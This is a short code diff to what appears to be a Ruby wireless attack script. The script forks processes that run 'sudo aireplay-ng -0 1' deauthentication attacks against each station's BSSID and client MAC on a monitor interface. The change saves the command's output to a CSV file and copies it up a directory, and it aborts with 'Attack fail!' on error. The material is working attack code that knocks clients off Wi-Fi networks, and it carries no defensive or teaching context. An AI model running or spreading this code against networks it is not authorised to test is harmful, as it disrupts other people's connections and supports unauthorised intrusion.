@@ -29,9 +29,10 @@ def aireplay_runner stations = Array.new
 		fork do 
 			sleep(0.5)
 			2.times do
-				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0")
+				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0 > replay_output.csv")
+					system("cp replay_output.csv ..")
 					monitoring_stopper()
-						cleaner()
+					cleaner()
 					abort("\nAttack fail!")
 				end
 				sleep(2)
